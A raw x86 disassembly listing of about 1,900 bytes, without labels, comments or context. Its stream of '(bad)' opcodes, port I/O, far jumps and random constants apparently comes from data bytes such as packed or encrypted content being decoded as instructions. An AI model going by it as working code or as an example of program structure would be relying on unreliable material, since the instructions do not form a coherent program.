  41f7c6:	xor    al,0x1a
  41f7c8:	jnp    0x41f7f2
  41f7ca:	sub    dh,BYTE PTR [edi+0x63]
  41f7cd:	push   esp
  41f7ce:	dec    edi
  41f7cf:	mov    gs,WORD PTR [edx+0x4b41cd2a]
  41f7d5:	mov    dl,ah
  41f7d7:	std    
  41f7d8:	cli    
  41f7d9:	xchg   eax,esi
  41f7db:	in     al,dx
  41f7dc:	(bad)  
  41f7dd:	cmp    ebx,DWORD PTR [ebp+0x5ee12f3f]
  41f7e3:	ins    DWORD PTR es:[edi],dx
  41f7e4:	inc    edi
  41f7e5:	loope  0x41f812
  41f7e7:	and    ah,dl
  41f7e9:	mov    BYTE PTR [ebx-0x76],dl
  41f7ec:	mov    esi,0x41c7e11
  41f7f1:	test   DWORD PTR [eax],ecx
  41f7f3:	mov    al,ds:0xeef0f511
  41f7f8:	cs jmp 0x41f7ed
  41f7fb:	xchg   ecx,eax
  41f7fc:	or     eax,0xe471fa57
  41f801:	push   ebx
  41f802:	adc    eax,DWORD PTR [ebx]
  41f804:	rol    DWORD PTR [edx+0x4fadbb6d],1
  41f80a:	push   edi
  41f80b:	sbb    eax,0x533ad829
  41f810:	pop    ss
  41f811:	dec    edi
  41f812:	fwait
  41f813:	jg     0x41f7bd
  41f815:	sahf   
  41f816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f817:	cmp    BYTE PTR [ecx-0x62],dh
  41f81a:	imul   esp,ecx,0xffffffe5
  41f81d:	pop    edi
  41f81e:	add    BYTE PTR [ebx-0xb43c78],cl
  41f824:	loope  0x41f875
  41f826:	ins    BYTE PTR es:[edi],dx
  41f827:	imul   esi,DWORD PTR [edx],0x2661efae
  41f82d:	jmp    DWORD PTR [ebx+edx*1+0x26a83346]
  41f834:	les    ecx,FWORD PTR [ebx+0x4e]
  41f837:	call   0x4eab405e
  41f83c:	inc    edx
  41f83d:	js     0x41f7d6
  41f83f:	test   BYTE PTR [edx+0x3c],dl
  41f842:	xor    al,0xa2
  41f844:	cmp    eax,0x9fe4d3af
  41f849:	pop    es
  41f84a:	repnz movs DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41f84d:	sub    eax,0x6130fb3c
  41f852:	(bad)  
  41f853:	cmc    
  41f854:	push   esp
  41f855:	mov    eax,0xe3fcaa6c
  41f85a:	mov    esp,0xe13bb209
  41f85f:	mov    ecx,0xf4af62ac
  41f864:	test   eax,0xc0b98b1b
  41f869:	adc    BYTE PTR [esi+0xe],al
  41f86c:	(bad)
  41f870:	bound  eax,QWORD PTR [ecx]
  41f872:	ret    0x24a4
  41f875:	out    0x5a,eax
  41f877:	fadd   DWORD PTR [esi+0x5a]
  41f87a:	jmp    0x2b3a:0xc4b15ef5
  41f881:	inc    esi
  41f882:	adc    eax,DWORD PTR [edi-0x25]
  41f885:	pop    eax
  41f886:	cmp    BYTE PTR [edi-0x45],dl
  41f889:	xchg   edx,eax
  41f88a:	in     eax,dx
  41f88b:	or     DWORD PTR [ecx+0x5f469c42],0x62
  41f892:	repnz mov DWORD PTR [eax+eiz*8-0x35],esp
  41f897:	ss pop esp
  41f899:	add    eax,0xb765681f
  41f89e:	push   ecx
  41f89f:	jmp    0x80a7f09c
  41f8a4:	add    eax,0x86fa16db
  41f8a9:	lahf   
  41f8aa:	xchg   esi,eax
  41f8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8ac:	mov    ebp,0x70c12f47
  41f8b1:	es mov ss:0x443e4d21,eax
  41f8b8:	fisttp QWORD PTR [ecx-0x4e]
  41f8bb:	cmp    cl,BYTE PTR [ebp-0x56]
  41f8be:	xchg   esp,eax
  41f8bf:	call   0x117:0xd304b385
  41f8c6:	sub    DWORD PTR [edi-0x19f6521c],0xffffffc3
  41f8cd:	fnsave [esp+edx*2-0x388ffdf0]
  41f8d4:	scas   al,BYTE PTR es:[edi]
  41f8d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8d6:	adc    edx,DWORD PTR [edx+0x506c552c]
  41f8dc:	sar    cl,1
  41f8de:	jae    0x41f8d7
  41f8e0:	in     eax,0xf2
  41f8e2:	scas   al,BYTE PTR es:[edi]
  41f8e3:	xor    cl,BYTE PTR [esi-0x68619e2e]
  41f8e9:	dec    eax
  41f8ea:	cwde   
  41f8eb:	imul   eax,DWORD PTR [esi-0x10],0x71
  41f8ef:	pusha  
  41f8f0:	push   eax
  41f8f1:	pop    esp
  41f8f2:	pop    ebp
  41f8f4:	inc    ebp
  41f8f5:	es cmp eax,0xcfa8b87e
  41f8fb:	std    
  41f8fc:	cmp    DWORD PTR [ecx-0x77],0xd1dd64
  41f903:	sti    
  41f904:	ror    DWORD PTR [eax-0xe],0xab
  41f908:	out    0x1d,al
  41f90a:	stos   BYTE PTR es:[edi],al
  41f90b:	pushf  
  41f90c:	scas   al,BYTE PTR es:[edi]
  41f90d:	mov    ebp,0x7eedf0d7
  41f912:	out    0x18,eax
  41f914:	les    eax,FWORD PTR [esi+edx*4]
  41f917:	fbld   TBYTE PTR [edi-0x6ab76a35]
  41f91d:	cmp    DWORD PTR [esp+edx*1],ebx
  41f920:	dec    edx
  41f921:	leave  
  41f922:	stos   DWORD PTR es:[edi],eax
  41f923:	div    BYTE PTR [edi]
  41f925:	jmp    0x41f8cd
  41f927:	dec    esp
  41f928:	loopne 0x41f981
  41f92a:	adc    DWORD PTR [eax+0x6e1b5d5f],edx
  41f930:	(bad)  
  41f932:	test   DWORD PTR [ebp-0x2f02884d],esi
  41f938:	js     0x41f932
  41f93a:	pop    esp
  41f93b:	dec    ecx
  41f93c:	cmp    eax,DWORD PTR [eax+0x36]
  41f93f:	and    BYTE PTR [edi-0x4dfafd0d],bl
  41f945:	xor    edx,0xffffffae
  41f948:	sub    al,0x1a
  41f94a:	xor    eax,0x9a0adfed
  41f94f:	adc    al,0x9b
  41f951:	dec    esp
  41f952:	sbb    eax,DWORD PTR [ebx+0x1f]
  41f955:	xlat   BYTE PTR ds:[ebx]
  41f956:	add    esi,DWORD PTR [edx-0x6b969374]
  41f95c:	or     ebp,DWORD PTR [ebp+0x792e83af]
  41f962:	daa    
  41f963:	gs cs aaa 
  41f966:	(bad)  
  41f968:	jns    0x41f996
  41f96a:	and    al,0x65
  41f96c:	fisttp WORD PTR [esi-0x27]
  41f96f:	pop    eax
  41f970:	loopne 0x41f90c
  41f972:	mov    DWORD PTR [ecx+0x70],ecx
  41f975:	std    
  41f976:	sahf   
  41f977:	and    bh,bl
  41f979:	mov    ecx,0x8b2ff45
  41f97e:	addr16 pop ebp
  41f980:	mov    fs,WORD PTR [edx+0x69f11c1d]
  41f986:	or     BYTE PTR [esi+0x6f2c9a0e],0xdc
  41f98d:	daa    
  41f98e:	push   esp
  41f98f:	and    al,0x90
  41f991:	and    ch,BYTE PTR [edx]
  41f993:	pushf  
  41f994:	jl     0x41f9b3
  41f996:	fs jl  0x41f9eb
  41f999:	sub    ah,BYTE PTR [ebx+0x4f]
  41f99c:	inc    ebx
  41f99d:	xlat   BYTE PTR ds:[ebx]
  41f99e:	dec    edx
  41f99f:	rcr    DWORD PTR [ecx+0x2e],cl
  41f9a2:	aam    0xd1
  41f9a4:	in     eax,dx
  41f9a5:	sub    DWORD PTR [edi-0x7],ebp
  41f9a8:	lea    ebp,[eax+0x45afdb60]
  41f9ae:	into   
  41f9af:	inc    ecx
  41f9b0:	jae    0x41f9f9
  41f9b2:	in     eax,0x66
  41f9b4:	pop    esp
  41f9b5:	stos   DWORD PTR es:[edi],eax
  41f9b6:	add    bh,0x0
  41f9b9:	lea    eax,ds:0x18908694
  41f9bf:	enter  0xc703,0xdb
  41f9c3:	mov    al,0xed
  41f9c5:	sbb    bl,BYTE PTR [ebp+0x4e]
  41f9c8:	or     ebx,DWORD PTR [esi]
  41f9ca:	push   edi
  41f9cb:	or     BYTE PTR [edx],dh
  41f9cd:	or     esp,DWORD PTR [ecx-0x7d]
  41f9d0:	mov    ecx,0x168abdf0
  41f9d5:	or     eax,0xc73b985c
  41f9da:	test   al,0x97
  41f9dc:	enter  0x5b26,0x3e
  41f9e0:	adc    al,0x43
  41f9e2:	xlat   BYTE PTR ds:[ebx]
  41f9e3:	cmp    bh,dl
  41f9e5:	push   eax
  41f9e6:	xor    eax,0x7608f158
  41f9eb:	add    bh,BYTE PTR [ecx+0x64d73c]
  41f9f1:	pop    ds
  41f9f2:	jmp    0x8ca4ffaa
  41f9f7:	inc    ebp
  41f9f8:	retf   
  41f9f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9fa:	push   edi
  41f9fb:	push   ss
  41f9fc:	pusha  
  41f9fd:	sbb    BYTE PTR ds:0x57847fc3,ah
  41fa03:	xor    cl,bl
  41fa05:	xlat   BYTE PTR ds:[ebx]
  41fa06:	xor    ecx,DWORD PTR [edi]
  41fa08:	out    0xb,eax
  41fa0a:	inc    ebp
  41fa0b:	xor    al,0x5c
  41fa0d:	cmp    DWORD PTR [eax+esi*8+0x17],0x620adef7
  41fa15:	pop    esp
  41fa16:	adc    bl,0x6
  41fa19:	sbb    al,dh
  41fa1b:	mov    esi,0x4f692ff3
  41fa20:	and    bl,BYTE PTR [ebx+eiz*4]
  41fa23:	shl    BYTE PTR [ebp+0x3c],cl
  41fa26:	pop    ebp
  41fa27:	dec    edx
  41fa28:	ret    0x9f9
  41fa2b:	loope  0x41f9f7
  41fa2d:	(bad)  
  41fa2e:	jge    0x41fa88
  41fa30:	out    dx,al
  41fa31:	aad    0x68
  41fa33:	push   edx
  41fa34:	pop    ebx
  41fa35:	mov    WORD PTR [edi],cs
  41fa37:	mov    ecx,0x6e2ce4a3
  41fa3c:	ins    BYTE PTR es:[edi],dx
  41fa3d:	mov    esi,0x1f635b5c
  41fa42:	jo     0x41fa1f
  41fa44:	cli    
  41fa45:	das    
  41fa46:	repnz lds eax,FWORD PTR [esi]
  41fa49:	add    DWORD PTR [ebx+0x545a40a8],esi
  41fa4f:	fst    DWORD PTR [esi+0x23da9237]
  41fa55:	cmp    edi,DWORD PTR [eax+edx*4]
  41fa58:	lods   al,BYTE PTR ds:[esi]
  41fa59:	sbb    DWORD PTR ds:0x15f0bdb7,0xb3f5972c
  41fa63:	xchg   esi,eax
  41fa64:	cwde   
  41fa65:	jne    0x41fa0a
  41fa67:	cmp    BYTE PTR [edx+0x1f07a10f],cl
  41fa6d:	lock jecxz 0x41fae4
  41fa70:	push   ss
  41fa71:	xchg   edi,eax
  41fa72:	nop
  41fa73:	push   ds
  41fa74:	fistp  DWORD PTR [edi+0x4]
  41fa77:	nop
  41fa78:	xchg   esi,edi
  41fa7a:	pop    ebp
  41fa7b:	js     0x41faa1
  41fa7d:	mov    cl,0xe2
  41fa7f:	sbb    ch,dl
  41fa81:	jecxz  0x41faa8
  41fa83:	je     0x41fa54
  41fa85:	out    0xff,eax
  41fa87:	xchg   DWORD PTR [ebp+0x60f06251],edx
  41fa8d:	(bad)  
  41fa8e:	mov    esp,0xfc31156
  41fa93:	(bad)
  41fa96:	dec    esi
  41fa97:	rcl    BYTE PTR [esi+0x17],0xa9
  41fa9b:	pop    es
  41fa9c:	jg     0x41fab1
  41fa9e:	mov    eax,edi
  41faa0:	xchg   ebp,eax
  41faa1:	scas   al,BYTE PTR es:[edi]
  41faa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faa3:	inc    edx
  41faa4:	std    
  41faa5:	fwait
  41faa6:	imul   BYTE PTR [edi+0x77]
  41faa9:	jbe    0x41fa63
  41faab:	test   BYTE PTR [edx],ah
  41faad:	adc    BYTE PTR [edx-0x15b201fb],dh
  41fab3:	in     eax,dx
  41fab4:	cmp    DWORD PTR [eax+eiz*8],ecx
  41fab7:	mov    esp,0xd77b3589
  41fabc:	push   ds
  41fabd:	lods   eax,DWORD PTR ds:[esi]
  41fabe:	dec    edi
  41fabf:	out    0x82,eax
  41fac1:	rcr    BYTE PTR [esi],cl
  41fac3:	outs   dx,BYTE PTR ds:[esi]
  41fac4:	and    BYTE PTR [ebp+edx*1+0xbaedd81],dl
  41facb:	not    ebp
  41facd:	(bad)
  41fad0:	push   es
  41fad1:	mov    BYTE PTR [ebp+0x3e],dl
  41fad4:	dec    edi
  41fad5:	pop    ebp
  41fad6:	adc    BYTE PTR [edi+0x3bfa0773],dh
  41fadc:	push   ss
  41fadd:	mov    ss,WORD PTR [esp+ebx*8+0x3ecdf114]
  41fae4:	repnz ds sub bh,dh
  41fae8:	dec    esp
  41fae9:	es and al,0x65
  41faec:	push   edx
  41faed:	xor    eax,0x9142d088
  41faf2:	into   
  41faf3:	or     DWORD PTR [ebx-0x4b56df7],0x93248d95
  41fafd:	ins    BYTE PTR es:[edi],dx
  41fafe:	or     eax,0x46c024e
  41fb03:	fistp  WORD PTR [edi-0x30e41e33]
  41fb09:	mov    edx,0x4230cfab
  41fb0e:	ins    BYTE PTR es:[edi],dx
  41fb0f:	outs   dx,BYTE PTR ds:[esi]
  41fb10:	jb     0x41fb0e
  41fb12:	inc    esp
  41fb13:	iret   
  41fb14:	es mov bl,0xac
  41fb17:	mov    ah,0x4
  41fb19:	xor    DWORD PTR [edi+0x1eea60cb],esi
  41fb1f:	dec    esi
  41fb20:	cdq    
  41fb21:	inc    esp
  41fb22:	jge    0x41faea
  41fb24:	add    DWORD PTR [esi+0x41457f38],0xffffffbd
  41fb2b:	imul   ebx,edx,0xfc601f53
  41fb31:	lds    edi,FWORD PTR [eax+0x6286cb3f]
  41fb37:	adc    BYTE PTR [eax-0x83d48f0],bl
  41fb3d:	gs jmp 0x57881d60
  41fb43:	pushf  
  41fb44:	fcmovnu st,st(1)
  41fb46:	xor    BYTE PTR [eax+0x3f],bh
  41fb49:	inc    ecx
  41fb4a:	fisttp QWORD PTR [edi+0xfe09d83]
  41fb50:	stos   BYTE PTR es:[edi],al
  41fb51:	mov    al,0xd4
  41fb53:	arpl   WORD PTR [edi],sp
  41fb55:	fcomp  DWORD PTR [eax-0x1005b91a]
  41fb5b:	ret    
  41fb5c:	jns    0x41fbc9
  41fb5e:	pop    ds
  41fb5f:	sub    DWORD PTR [eax-0x3932ccf],0xa740ebb4
  41fb69:	mov    cl,0xcc
  41fb6b:	sahf   
  41fb6c:	daa    
  41fb6d:	xlat   BYTE PTR ds:[ebx]
  41fb6e:	in     eax,0xe3
  41fb70:	movd   DWORD PTR [esi],mm6
  41fb73:	and    ah,ah
  41fb75:	sub    al,0xca
  41fb77:	push   0x1
  41fb79:	(bad)  
  41fb7a:	or     eax,0x17ee6fb6
  41fb7f:	mov    edi,0xa0d89c49
  41fb84:	mov    bl,0x87
  41fb86:	data16 mov bl,0x6a
  41fb89:	scas   al,BYTE PTR es:[edi]
  41fb8a:	xlat   BYTE PTR ds:[ebx]
  41fb8b:	inc    edi
  41fb8c:	sub    eax,0x16c3fe82
  41fb91:	inc    esi
  41fb92:	aas    
  41fb93:	test   eax,0x2bb3aba3
  41fb98:	xchg   esp,eax
  41fb99:	cmp    ecx,DWORD PTR [ecx-0x25e82213]
  41fb9f:	pusha  
  41fba0:	mov    ebx,0x76242d79
  41fba5:	xor    esp,ebp
  41fba7:	pop    edi
  41fba8:	push   es
  41fba9:	ds xchg edx,eax
  41fbab:	dec    edi
  41fbac:	js     0x41fbb5
  41fbae:	iret   
  41fbaf:	stc    
  41fbb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbb1:	cmc    
  41fbb2:	in     al,dx
  41fbb3:	in     eax,dx
  41fbb4:	cmc    
  41fbb5:	push   ebp
  41fbb6:	inc    esp
  41fbb7:	mov    edx,0x350f981c
  41fbbc:	mov    eax,0x40ac37d1
  41fbc1:	cs cdq 
  41fbc3:	aad    0xcf
  41fbc5:	jg     0x41fbee
  41fbc7:	(bad)  [edx+esi*1-0x6a7b23f]
  41fbce:	jp     0x41fc07
  41fbd0:	sub    esp,DWORD PTR [esi]
  41fbd2:	mul    ah
  41fbd4:	das    
  41fbd5:	pop    es
  41fbd6:	enter  0xade6,0xea
  41fbda:	cmp    dh,dl
  41fbdc:	xchg   esp,eax
  41fbdd:	cmp    dl,BYTE PTR [ebp+0x1]
  41fbe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbe1:	and    al,BYTE PTR [edx+0x52]
  41fbe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbe5:	retf   
  41fbe6:	xor    eax,0x370c47a
  41fbeb:	jge    0x41fbc3
  41fbed:	adc    al,0x73
  41fbef:	mov    bh,BYTE PTR [ebx]
  41fbf1:	cmp    BYTE PTR [eax-0x74],bl
  41fbf4:	inc    ecx
  41fbf5:	je     0x41fbd7
  41fbf7:	add    edi,esi
  41fbf9:	setp   BYTE PTR [ebx]
  41fbfc:	ja     0x41fb83
  41fbfe:	mov    ah,0x16
  41fc00:	xor    esi,eax
  41fc02:	pop    esi
  41fc03:	mov    ecx,0x4635c818
  41fc08:	arpl   WORD PTR [ebx-0x44b560e5],sp
  41fc0e:	into   
  41fc0f:	stos   DWORD PTR es:[edi],eax
  41fc10:	mov    dh,BYTE PTR [edi-0x55]
  41fc13:	xchg   edx,eax
  41fc14:	mov    cl,BYTE PTR [eax-0xf]
  41fc17:	cs stc 
  41fc19:	adc    eax,edi
  41fc1b:	sti    
  41fc1c:	ja     0x41fc26
  41fc1e:	into   
  41fc1f:	pusha  
  41fc20:	mov    ebp,DWORD PTR [ecx+ebp*1-0x6c846234]
  41fc27:	shr    DWORD PTR [esi-0x33428f23],cl
  41fc2d:	je     0x41fc76
  41fc2f:	push   0xe9feae8c
  41fc34:	aad    0x60
  41fc36:	cmp    DWORD PTR [ebp-0x11],0x2f
  41fc3a:	sbb    edx,DWORD PTR [edi-0x2c]
  41fc3d:	xor    al,0xd0
  41fc3f:	scas   al,BYTE PTR es:[edi]
  41fc40:	cmp    al,0x5f
  41fc42:	and    BYTE PTR [ebx+0xe],bh
  41fc45:	in     al,0xf6
  41fc47:	mov    eax,ds:0x246ee3e7
  41fc4c:	cli    
  41fc4d:	lock jb 0x41fc80
  41fc50:	fwait
  41fc51:	sbb    BYTE PTR [ebx+edx*8],0xc5
  41fc55:	mov    BYTE PTR [ebx+esi*1+0x1b7b951],al
  41fc5c:	pushf  
  41fc5d:	xchg   ebx,eax
  41fc5e:	cmp    DWORD PTR [ecx],ecx
  41fc60:	sub    DWORD PTR [esi-0x16bccda6],0xc6a7b460
  41fc6a:	mov    ecx,0x9966c788
  41fc6f:	pusha  
  41fc70:	dec    ebp
  41fc71:	fdivr  DWORD PTR [ecx]
  41fc73:	sti    
  41fc74:	pop    edi
  41fc75:	pop    esp
  41fc76:	test   DWORD PTR [eax],ebx
  41fc78:	lock shl BYTE PTR [edx],cl
  41fc7b:	dec    esi
  41fc7c:	in     al,0xfc
  41fc7e:	sbb    eax,0xf86e3dc8
  41fc83:	mov    BYTE PTR ss:[ebp-0x76c3b998],ch
  41fc8a:	xor    ecx,DWORD PTR [ebx-0x72792dbb]
  41fc90:	pop    edi
  41fc91:	(bad)  
  41fc92:	or     al,0x16
  41fc94:	inc    ecx
  41fc95:	adc    bl,BYTE PTR [ebx+0x26c0934d]
  41fc9b:	test   edi,0x5c1ef55
  41fca1:	jnp    0x41fc9f
  41fca3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fca4:	and    edi,DWORD PTR [edx+0x3429f42d]
  41fcaa:	jae    0x41fd00
  41fcac:	in     al,dx
  41fcad:	and    al,0x6d
  41fcaf:	outs   dx,DWORD PTR ds:[esi]
  41fcb0:	or     BYTE PTR [edi-0xf7d5f15],cl
  41fcb6:	das    
  41fcb7:	fidivr WORD PTR [eax]
  41fcb9:	cmp    eax,0x70ecfae2
  41fcbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcbf:	test   eax,0x5ceafdb5
  41fcc4:	enter  0xee2c,0x59
  41fcc8:	push   ebp
  41fcc9:	xor    ah,bl
  41fccb:	cs test eax,0xbf79c6f2
  41fcd1:	cs add ebx,ebp
  41fcd4:	xchg   DWORD PTR [eax],esp
  41fcd6:	ss into 
  41fcd8:	test   eax,0x2bbc96c6
  41fcdd:	bound  edx,QWORD PTR [edx]
  41fcdf:	leave  
  41fce0:	pop    ebx
  41fce1:	push   0x1a69d232
  41fce6:	add    al,0x54
  41fce8:	ret    
  41fce9:	in     eax,dx
  41fcea:	test   DWORD PTR [edi+0x4b],edx
  41fced:	out    0xd,al
  41fcef:	out    dx,eax
  41fcf0:	adc    ecx,DWORD PTR [ebx-0x5c53305b]
  41fcf6:	sbb    ecx,DWORD PTR [edx+0x5d]
  41fcf9:	mov    ebp,0x8035b88a
  41fcfe:	icebp  
  41fcff:	add    al,0x92
  41fd01:	jle    0x41fd1e
  41fd03:	(bad)  
  41fd04:	adc    al,0xe2
  41fd06:	jnp    0x41fd1c
  41fd08:	inc    ecx
  41fd09:	sub    BYTE PTR [ebp+0x6f7e1e84],ah
  41fd0f:	cmp    al,0x8f
  41fd11:	xchg   ebp,eax
  41fd12:	mov    ah,bl
  41fd14:	cmp    BYTE PTR [edx],bh
  41fd16:	ds hlt 
  41fd18:	lea    edx,[esi+eax*4]
  41fd1b:	mov    ebx,0xf4b150a3
  41fd20:	clc    
  41fd21:	push   0x4a725cc0
  41fd26:	add    DWORD PTR [eax-0x64ee7d81],ecx
  41fd2c:	faddp  st(2),st
  41fd2e:	xchg   esi,eax
  41fd2f:	jo     0x41fd86
  41fd31:	xchg   edi,eax
  41fd32:	into   
  41fd33:	jmp    0x87fc720a
  41fd38:	and    al,0x81
  41fd3a:	(bad)  
  41fd3b:	std    
  41fd3c:	and    dl,al
  41fd3e:	ror    bh,1
  41fd40:	adc    DWORD PTR [eax+edx*4+0x3b1f87bf],edx
  41fd47:	sbb    eax,DWORD PTR [edi+0x313f4a6a]
  41fd4d:	cs push ebx
  41fd4f:	sub    BYTE PTR [edx],0xc5
  41fd52:	pop    esp
  41fd53:	loope  0x41fd3b
  41fd55:	cmp    edx,DWORD PTR [edx-0x29f8956c]
  41fd5b:	mov    ch,0xc0
  41fd5d:	out    0xc7,al
  41fd5f:	add    edi,ebp
  41fd61:	dec    edi
  41fd62:	mov    dh,0x4c
  41fd64:	loop   0x41fd73
  41fd66:	fcomp  QWORD PTR [edi+0x4ecd864f]
  41fd6c:	test   eax,0x16ede4c
  41fd71:	cwde   
  41fd72:	stc    
  41fd73:	adc    eax,0x367c14a6
  41fd78:	call   0x9027034e
  41fd7d:	xchg   edx,eax
  41fd7e:	je     0x41fd08
  41fd80:	mov    al,ds:0x89542886
  41fd85:	jmp    0x41fd44
  41fd87:	test   BYTE PTR [esi+0x4d5a20dd],bh
  41fd8d:	xchg   esp,eax
  41fd8e:	leave  
  41fd8f:	push   ebp
  41fd90:	jmp    0xdacfba08
  41fd95:	repnz or BYTE PTR [ecx],ah
  41fd98:	loopne 0x41fdbb
  41fd9a:	or     eax,0xf4e1465f
  41fd9f:	jne    0x41fde5
  41fda1:	out    dx,eax
  41fda2:	sbb    esi,DWORD PTR [edi]
  41fda4:	or     eax,0xda496036
  41fda9:	sub    esp,DWORD PTR [esi-0x68]
  41fdac:	pop    ss
  41fdad:	cmp    cl,ch
  41fdaf:	dec    ecx
  41fdb0:	inc    edx
  41fdb1:	xchg   BYTE PTR [ecx],dh
  41fdb3:	hlt    
  41fdb4:	xor    al,0x63
  41fdb6:	sbb    ch,bl
  41fdb8:	das    
  41fdb9:	sbb    al,0x37
  41fdbb:	dec    ebx
  41fdbc:	test   BYTE PTR [esi-0x24],0x1b
  41fdc0:	xchg   edi,eax
  41fdc1:	dec    ecx
  41fdc2:	cmc    
  41fdc3:	inc    ebx
  41fdc4:	test   DWORD PTR [ecx],esi
  41fdc6:	daa    
  41fdc7:	dec    ebx
  41fdc8:	(bad)  
  41fdc9:	xchg   ebx,eax
  41fdca:	or     al,0xc0
  41fdcc:	(bad)  
  41fdce:	mov    ds:0xa122209a,eax
  41fdd3:	into   
  41fdd4:	ins    DWORD PTR es:[edi],dx
  41fdd5:	(bad)  
  41fdd6:	mov    eax,ds:0x96b4545f
  41fddb:	jae    0x41fdfb
  41fddd:	and    al,0x3a
  41fddf:	aam    0x7
  41fde1:	imul   ebx,DWORD PTR [edi-0x55],0x49
  41fde5:	in     eax,0x10
  41fde7:	popa   
  41fde8:	ror    ch,0xa7
  41fdeb:	or     al,0x12
  41fded:	pop    ebx
  41fdee:	shl    DWORD PTR [eax+ebp*2+0x10e65d19],1
  41fdf5:	pop    edx
  41fdf6:	sahf   
  41fdf7:	stos   DWORD PTR es:[edi],eax
  41fdf8:	or     DWORD PTR [ecx+0x36],0xfffffff8
  41fdfc:	lea    edi,[edx-0x63cd37ef]
  41fe02:	xor    DWORD PTR [edi-0x35],esi
  41fe05:	push   ss
  41fe06:	cwde   
  41fe07:	cmc    
  41fe08:	sahf   
  41fe09:	or     cl,ah
  41fe0b:	leave  
  41fe0c:	stos   DWORD PTR es:[edi],eax
  41fe0d:	pop    ecx
  41fe0e:	inc    ecx
  41fe0f:	test   eax,0x391aab00
  41fe14:	les    ebx,FWORD PTR [eax-0x6e]
  41fe17:	ja     0x41fe80
  41fe19:	mov    edi,0x9fefbf9a
  41fe1e:	xchg   DWORD PTR [edx+0x2e],ebx
  41fe21:	clc    
  41fe22:	xchg   edi,eax
  41fe23:	mov    WORD PTR [edx],?
  41fe25:	fs pushf 
  41fe27:	arpl   ax,ax
  41fe29:	sbb    esp,DWORD PTR [eax+0x45c0d84b]
  41fe2f:	xor    eax,0xe1d7e9c8
  41fe34:	add    ah,dl
  41fe36:	(bad)  
  41fe37:	or     BYTE PTR [edi+0x738eff7a],bh
  41fe3d:	push   ecx
  41fe3e:	or     al,0xc5
  41fe40:	sbb    esp,DWORD PTR [eax-0x5cc1d1b6]
  41fe46:	imul   eax,edi,0x4af3bf2d
  41fe4c:	sar    DWORD PTR [esi],1
  41fe4e:	cmp    esp,eax
  41fe50:	pop    esi
  41fe51:	stos   BYTE PTR es:[edi],al
  41fe52:	cmp    edi,DWORD PTR [edx+ebx*8+0x4e5976a]
  41fe59:	(bad)  
  41fe5a:	ja     0x41fdfa
  41fe5c:	jae    0x41fe62
  41fe5e:	out    dx,al
  41fe5f:	jmp    0x41fe1a
  41fe61:	lods   eax,DWORD PTR ds:[esi]
  41fe62:	mov    ds:0xc4ecd640,al
  41fe67:	jno    0x41fe12
  41fe69:	pop    ds
  41fe6a:	push   edx
  41fe6b:	stos   DWORD PTR es:[edi],eax
  41fe6c:	rcr    BYTE PTR [edi-0x76],0x46
  41fe70:	loope  0x41fe1e
  41fe72:	bound  ecx,QWORD PTR [eax]
  41fe74:	mov    ah,0x42
  41fe76:	pop    edi
  41fe77:	jmp    0xda0c:0x7b7c5eb1
  41fe7e:	je     0x41fe42
  41fe80:	pop    eax
  41fe81:	push   0xbe14213
  41fe86:	ins    BYTE PTR es:[edi],dx
  41fe87:	xor    eax,0x1ddf6d38
  41fe8c:	push   0x12
  41fe8e:	jecxz  0x41fea0
  41fe90:	fimul  WORD PTR [eax-0xacfff6d]
  41fe96:	inc    edi
  41fe97:	sti    
  41fe98:	in     eax,dx
  41fe99:	jne    0x41fefb
  41fe9b:	loopne 0x41fe80
  41fe9d:	mov    BYTE PTR [esi+0x2],ch
  41fea0:	fistp  DWORD PTR [eax-0x51]
  41fea3:	mov    ebp,0x798995f6
  41fea8:	sbb    DWORD PTR es:[esi],edi
  41feab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41feac:	aas    
  41fead:	les    ebx,FWORD PTR [ebx]
  41feaf:	dec    esp
  41feb0:	call   0x7d7e:0x40ba933d
  41feb7:	ins    DWORD PTR es:[edi],dx
  41feb8:	fild   QWORD PTR [ecx]
  41feba:	pop    esp
  41febb:	pop    eax
  41febc:	(bad)  
  41febd:	xchg   esi,eax
  41febe:	inc    edx
  41febf:	retf   0xca66
  41fec2:	cmp    BYTE PTR ds:0x5b549ec7,al
  41fec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fec9:	xchg   BYTE PTR ds:0xe941ca3c,cl
  41fecf:	and    BYTE PTR [edi-0x67],bl
  41fed2:	mov    al,0x87
  41fed4:	sbb    eax,0x1feb5e90
  41fed9:	dec    esi
  41feda:	jns    0x41ff53
  41fedc:	lahf   
  41fedd:	sub    DWORD PTR [eax],0x411b0f1
  41fee3:	mov    ds,WORD PTR [edx+0x32]
  41fee6:	stos   DWORD PTR es:[edi],eax
  41fee7:	(bad)  
  41fee8:	in     eax,0xf6
  41feea:	(bad)  
  41feeb:	sbb    ah,BYTE PTR [edx+0x5a]
  41feee:	pop    ebp
  41feef:	repz cmp DWORD PTR [esi-0x3e43cdfc],ecx
  41fef6:	cwde   
  41fef7:	sar    DWORD PTR [ecx+0x3825c828],cl
  41fefd:	sbb    DWORD PTR [eax-0x69090b16],edi
  41ff03:	jnp    0x41feb4
  41ff05:	fcom   DWORD PTR [ebp+0x353f7744]
  41ff0b:	sbb    eax,0xff11e116
  41ff10:	popf   
  41ff11:	inc    esi
  41ff12:	loop   0x41ff04
  41ff14:	nop
  41ff15:	nop
  41ff16:	xor    eax,0x3932ce88
  41ff1b:	mov    bl,0xc1
  41ff1d:	iret   
  41ff1e:	mov    DWORD PTR [edx-0x6546fe38],esi
  41ff24:	cmp    DWORD PTR [ebp+0x5a],esi
  41ff27:	movups xmm1,xmm0
  41ff2a:	das    
  41ff2b:	daa    
  41ff2c:	sbb    eax,0xfb7891c5
  41ff31:	lods   al,BYTE PTR ds:[esi]
  41ff32:	jmp    0x41fee3
  41ff34:	aas    
  41ff35:	mov    bh,0x70
  41ff37:	add    ebx,ebp
